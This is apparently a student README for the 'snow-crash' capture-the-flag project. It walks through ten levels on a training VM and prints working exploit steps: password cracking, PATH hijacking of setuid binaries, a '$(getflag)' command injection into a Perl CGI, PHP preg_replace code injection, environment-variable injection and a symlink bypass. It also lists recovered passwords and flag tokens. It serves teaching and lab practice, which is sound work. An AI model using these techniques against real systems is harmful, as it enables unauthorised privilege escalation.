# snow-crash

snow-crash is the first project of the cybersecurity branch at 42.
The goal is to give an introduction to cybersecurity.

An ISO for a VM, booted on Debian, is provided to use, where the goal will ultimately be privilege escalation through different vulnerabilities and exploits.
The project is separated in 15 levels. The current level needs to be completed before we can move on to the next.

In this README, we will go over the first 10 (so far), explaining what the strategies were, where our ideas fell short, how we figured it out.

## General Rules

We start as a user called `level00`. The goal is to find the password to upgrade to the user named `flag00`, where we will finally get the password to the user `level01`, so on and so forth up to `level09`.

## Levels

### Level00

The first level was, for me, the hardest. I didn't know where to begin and was at a complete loss.
I first tried looking around the files, seeing if anything had a weird name, an unusal extensions or anything of interest really. 

But I couldn't find anything.

I then started looking online if any tool, pre-install on Linux, could help me. I found the `find` command. After reading documentation i used :
```
 find / -user flag00 2>/dev/null
```
Basically looking for files or directories owned by the user I was trying to be.

I got :
```
/usr/sbin/john
/rofs/usr/sbin/john
```

After checking inside these directories, we find :
```
----r--r--  1 flag00  flag00      15 Mar  5  2016 john
cat john 
cdiiddwpgswtgt
```

It's looking like a encrypted code. After looking around the internet I found the __caesar cipher__, a basic algorithm that shift every letter of a string to make it unreadable. With a shift key of 1, we get this string :
```
nottoohardhere
```

And sure enough, it's the password to the `flag00` user.
We can then ge the password for the `level01` user :
```
x24ti5gi3x0ol2eh4esiuxias
```

### Level01

For the second level, I started looking around available directories I could access. I ended up finding this directory :
```
cat etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
level00:x:2000:2000::/home/user/level00:/bin/bash
level01:x:2001:2001::/home/user/level01:/bin/bash
level02:x:2002:2002::/home/user/level02:/bin/bash
level03:x:2003:2003::/home/user/level03:/bin/bash
level04:x:2004:2004::/home/user/level04:/bin/bash
level05:x:2005:2005::/home/user/level05:/bin/bash
level06:x:2006:2006::/home/user/level06:/bin/bash
level07:x:2007:2007::/home/user/level07:/bin/bash
level08:x:2008:2008::/home/user/level08:/bin/bash
level09:x:2009:2009::/home/user/level09:/bin/bash
level10:x:2010:2010::/home/user/level10:/bin/bash
level11:x:2011:2011::/home/user/level11:/bin/bash
level12:x:2012:2012::/home/user/level12:/bin/bash
level13:x:2013:2013::/home/user/level13:/bin/bash
level14:x:2014:2014::/home/user/level14:/bin/bash
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

If you notice the very last line you can notice it not like any other one, plus it relates to the user we trying to find the password for. 

In Linux systems, user are stores this way :
```
username: x :userID:groupID:userinfo:/homedir:/bin/bash
```
x being the hashed password for the user.

So we have the password for flag01, we just need to decrypted it. Looking online I found the popular DES algorithm created in the 70's (not used anymore because it's can be easily cracked).
So to crack the password, I used `john the ripper`, a tool for linux system that allows use to crack hashed password.

in the ended we got :
```
john --show flag01.hash
?:abcdefg

su flag01
Password: 
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```

### Level02

When starting level02, we directly find a .pcap file. This extension is used by Wireshark, which is an open-source network anaylzer tool. When opening the file via Wireshark, we get a lot of informations regarding 95 packets of data sent and receiving. Too much to look throught each manually. 

I wasn't famialiar with Wireshark so I followed tutorials online helping me understand use the tool and make sense of what I was looking at. Eventually I found the option to `follow the TCP stream` which reconstruct the exchanges of data.

We got something like this :
```
..%..%..&..... ..#..'..$..&..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."........!........"..".....b........b....    B.
..............................1.......!.."......"......!..........."........"..".............    ..
.....................
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: l.le.ev.ve.el.lX.X
..
Password: ft_wandr...NDRel.L0L
.
..
Login incorrect
wwwbugs login: "
```

So we know somebody tried connected to a user but used the wrong password. I have the password but it's composed of non printable character, so I need to `show data as HEX DUMP`, a Wireshark tool, so I can see the hexa ASCII of the input.
We got this :
```
...Passw ord: 
000000B9  66                                                 f
000000BA  74                                                 t
000000BB  5f                                                 _
000000BC  77                                                 w
000000BD  61                                                 a
000000BE  6e                                                 n
000000BF  64                                                 d
000000C0  72                                                 r
000000C1  7f                                                 .
000000C2  7f                                                 .
000000C3  7f                                                 .
000000C4  4e                                                 N
000000C5  44                                                 D
000000C6  52                                                 R
000000C7  65                                                 e
000000C8  6c                                                 l
000000C9  7f                                                 .
000000CA  4c                                                 L
000000CB  30                                                 0
000000CC  4c                                                 L
000000CD  0d                                                 .
```

Now comparing those ASCII code to the ASCII table, we get :
```
ft_wandr[erase][erase][erase]NDRel[erase]L0L[enter]
ft_waNDReL0L
```

And sure enough, that the password I was looking for :

```
su flag02
Password: ft_waNDReL0L
Don't forget to launch getflag !
flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
```

### Level03

Starting level30, we get a binary. When executed we get :
```
./level03 
Exploit me
```

So the goal is pretty clear. I try launching the binary with GBD and use the `disas main` GDB command, which allows use to got the assembly code of the binary :
```
(gdb) disas main
Dump of assembler code for function main:
   
0x080484a4 <+0>:    push   %ebp
   0x080484a5 <+1>:    mov    %esp,%ebp
   0x080484a7 <+3>:    and    $0xfffffff0,%esp
   0x080484aa <+6>:    sub    $0x20,%esp
   0x080484ad <+9>:    call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:    mov    %eax,0x18(%esp)
   0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:    mov    %eax,0x1c(%esp)
   0x080484bf <+27>:    mov    0x18(%esp),%eax
   0x080484c3 <+31>:    mov    %eax,0x8(%esp)
   0x080484c7 <+35>:    mov    0x18(%esp),%eax
   0x080484cb <+39>:    mov    %eax,0x4(%esp)
   0x080484cf <+43>:    mov    0x18(%esp),%eax
   0x080484d3 <+47>:    mov    %eax,(%esp)
   0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:    mov    0x1c(%esp),%eax
   0x080484df <+59>:    mov    %eax,0x8(%esp)
   0x080484e3 <+63>:    mov    0x1c(%esp),%eax
   0x080484e7 <+67>:    mov    %eax,0x4(%esp)
   0x080484eb <+71>:    mov    0x1c(%esp),%eax
   0x080484ef <+75>:    mov    %eax,(%esp)
   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave  
   0x08048504 <+96>:    ret 
```

We can notice those lines :

```
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
```

These lines tell use that the function `system()` is called, and the parameter of this function is put at the top of the stack just before.
`system()` can be a dangerous function. If the absolute path of the binary is not specified, we can hijack the execution by a script with the same name.

So that what we are going to do. Since the binary prints something when executed, I assume it's the `echo` binary we will hijack.
We are going to create a very small script called echo and change the PATH in the env :
```
cd /tmp
echo "/bin/bash" > echo
export PATH=/tmp:$PATH
./level03
```

And that gives us access to the flag03 user !

Why does it work ? The binary level03 has the following permission :
```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

The binary has a `s` bit set it's permission meaning whoever runs the file temporarily gains the permissions of the file's owner (aka flag03).
So when we execute bash through the binary owned by level03, we get it's privileges but before running bash. 
So when the program executes bash, we already have the flag03 privileges and can get our flag :
```
qi0maab88jeaj46qoumi7maus
```

###  Level04

When entering level04, we find this script :
```
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

We see a comment about localhost:4747, and use `CGI`. `CGI` is a techno used to make web server execute script.
Another thing we can notice is the `print echo $y 2>&1` uses backticks and not quotes.
We can probably input a command here.

The permission of the script are :
```
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
```
So when executing the script we run with the permission of flag04 (owner of the file).

We need to run something like this :
```
curl 'http://localhost:4747/level04.pl?x=<COMMAND>'
```

First I wanted to try and execute bash when the script was running :
```
First I wanted to try and execute bash when the script was running :
```
But I would get stuck on a loop on the web server and couldn't do anything

I needed to execute a non-interactive command, like getflag
I tried inserting the command like so :
```
"http://localhost:4747/level04.pl?x=tototot;` `getflag"
getflag
tototot
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```

But the way the input it's parsed by the web server would 'eat' my semicolon and my command would never reached the script 

But using Command Substitution would work because $ and () are not parsed by web server :
```
curl 'http://localhost:4747/level04.pl?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

### Level05

So when we log in as level05, we have a new notification that we have new mail :

```
level05@10.12.200.38's password: 
You have new mail.
```

So the first instict will be to look for files named, owned or group by `mail`
We find this :
```
find / -group mail 2> /dev/null
/usr/bin/dotlockfile
/usr/bin/mail-lock
/usr/bin/mail-touchlock
/usr/bin/mail-unlock
/var/mail
/var/mail/level05
/rofs/usr/bin/dotlockfile
/rofs/usr/bin/mail-lock
/rofs/usr/bin/mail-touchlock
/rofs/usr/bin/mail-unlock
/rofs/var/mail
/rofs/var/mail/level05
```

Let's look at the level05 ones :
```
/var/mail$ cat level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

So there's a crontab reoccurring tasks that executes every 2 mins. Let's have a look of the file :
```
/usr/sbin$ cat openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

So the task executed executes and deletes all the scripts in the `/opt/openarenaserver/` as `flag05`


So the solution is pretty straight forward. We need to write a script that executes the `getflag` command and output the result in a readable file.

```
#!/bin/bash


getflag > /tmp/flag.txt
```

And we get :
```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

### Level06

Starting level06 we have a binary and the source code :

```
 cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

We see that the binary looks for a string like this :
```
[x <input>]
```

So we probably need to enter that as a argument.
When we try to put the raw string as argument we get :

```
./level06 [x ]
PHP Warning:  file_get_contents([x ]): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
```

So we need to make the input a file. 
We can also notice the `/e` in the `preg_replace` function. That means PHP will execute the input as it's own code. The goal is definitely code injection. 
We first try to inject the getflag function as input :
```
[x getflag]
```

But the binary takes the `geflag` as a constant and not as a function.
Looking online I found something called [Complex Curly Syntax]( https://post.bytes.com/forum/topic/php/9768-use-of-complex-curly-bracket-syntax).

I tried mimicking the syntax :
```
[x {${getflag}}]
```

But it would work either so I needed a function to actually execute the `getflag` command. I first tried `execve` but the binary wouldn't recognize this function. 
Looking at the `execve` man in PHP,  I tried using similar and related  function. Finally  it worked with the `system` function :
```
cat /tmp/script.txt
[x {${system(getflag)}}]

./level06 /tmp/script.txt
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
And we got the flag !
```
wiok45aaoguiboiki2tuin6ub
```

### Level07

We have a binary file.
Executing the binary file we get :
```
./level07
level07
```

The binary is owned by flag07 and has the `s` permission, so similar as before, the goal is to execute the getflag command as flag07 to get the flag.

Decompiling the binary with Ghidra we get :
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    gid_t egid = getegid();
    uid_t euid = geteuid();

    setresgid(egid, egid, egid);
    setresuid(euid, euid, euid);

    char *env_var = getenv("SHELL");
    char *cmd;
    asprintf(&cmd, "%s %s", env_var, "Permission denied, please try again.");

    system(cmd);

    free(cmd);
    return 0;
}
```
We know we cannot trust Ghidra 100% so we also use GDB to get more informations. We can find trace of the functions `getenv` and `system`.

We can deduce the binary prints something from the environment.
We can try exporting a variable into the environment to get the flag we want.

Trying exporting a variable we get :
```
level07@SnowCrash:~$ export LOGNAME=try
level07@SnowCrash:~$ ./level07
try
```

So we now know with env variable is printed by the binary :
```
 level07@SnowCrash:~$ export LOGNAME="getflag"
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

### Level08

Same as before, we get a binary file. When decompiling ot we get :
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>

int main(int argc, char **argv, char **envp)
{
    char buf[1024];
    int fd;
    int rc;
    
    // Stack canary check is handled by compiler flag -fstack-protector
    
    // Check if argc is not 2
    if (argc != 2) {
        printf("%s [file to read]\n", argv[0]);
        exit(1);
    }
    
    // Check if argv[1] contains "token"
    if (strstr(argv[1], "token") != NULL) {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
    }
    
    // Open the file
    fd = open(argv[1], O_RDONLY);
    if (fd == -1) {
        err(1, "Unable to open %s", argv[1]);
    }
    
    // Read from file
    rc = read(fd, buf, sizeof(buf));
    if (rc == -1) {
        err(1, "Unable to read fd %d", fd);
    }
    
    // Write to stdout
    write(1, buf, rc);
    
    return 0;
}
```

Confirming the functions use in this binary using `nnm -u` :
```
nm -u >> strstr
         open
         exit
         read
         write
         err

```

The function that we can notice is `strstr` which is the most susceptible to have a vunerability by the way is build.
We tried several things but nothing was conclusive.

The next lead was finding a file or directoy we could open, but the binary could. We found this :
```
level08@SnowCrash:~$ env | grep FULL
FULL_PATH=/home/user/level08/token
```

We tried creating a sym link :
```
level08@SnowCrash:~$ ln -s "$FULL_PATH" /tmp/secret_file
level08@SnowCrash:~$ ./level08 /tmp/secret_file
quif5eloekouj29ke0vouxean
su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

### Level09

Level09 is the last level. We, once again, get a binary file and a token file.
When executing the binary we get something like this :
```
./level09 0
0
./level09 01
02
./level09 1
1
./level09 11
12
```

So basically the binary adds the index number to the actual ASCII value of each char in the input.

The token we're given looks like this :
```
f4kmm6p|=<82>^?p<82>n<83><82>DB<83>Du{^?<8C><89>
```

So we decided to do the same thing as the binary and add the index to the value of each char in the toke string, but it didn't work.
We then tried to substract the index to the ASCII value of each char in the token, which gave us:
```
66 34 6b 6d 6d 36 70 7c 3d 82 7f 70 82 6e 83 82 44 42 83 44 75 7b 7f 8c 89 0a (in hexa)
```

And sure enought that gave us the flag :
```
f3iji1ju5yuevaus41q1afiuq
```

And token :
```
s5cAJpM8ev6XHw998pRWG728z
```